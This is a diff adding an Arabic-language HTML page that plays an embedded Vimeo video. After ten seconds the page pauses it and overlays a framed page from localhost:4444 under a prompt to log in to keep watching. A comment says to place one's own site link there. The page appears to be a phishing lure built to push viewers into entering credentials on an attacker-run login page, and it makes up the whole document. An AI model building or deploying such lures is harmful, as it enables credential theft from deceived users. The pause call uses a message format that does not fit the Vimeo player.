@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقعي</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background-color: white;
+        }
+        .container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+        .page {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            background-color: white;
+        }
+        .page2 {
+            background-color: white;
+            width: 100%;
+            height: 80%;
+            bottom: 0;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 1s;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+        .page2.visible {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .page1 iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .page2 iframe {
+            width: 100%;
+            height: 90%;
+            border: none;
+        }
+        .page2 h1 {
+            margin: 0;
+            padding: 20px;
+            font-size: 24px;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="page page1">
+            <!-- تضمين فيديو TikTok -->
+<iframe title="vimeo-player" src="https://player.vimeo.com/video/947588760?h=65664fd801" width="640" height="360" frameborder="0"    allowfullscreen></iframe>        </div>
+        <div class="page page2" id="siteOverlay">
+            <h1>قوم بي تسجل دخول لي اكمال الفيديو</h1>
+            <!-- ضع هنا رابط موقعك الإلكتروني -->
+            <iframe src="http://localhost:4444" frameborder="0"></iframe>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var overlay = document.getElementById("siteOverlay");
+
+            // أظهر الصفحة الثانية بعد 10 ثواني وقم بإيقاف الفيديو
+            setTimeout(function() {
+                overlay.classList.add('visible');
+                var iframe = document.querySelector('.page1 iframe');
+                iframe.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', '*');
+            }, 10000);  // 10 ثواني
+        });
+    </script>
+</body>
+</html>
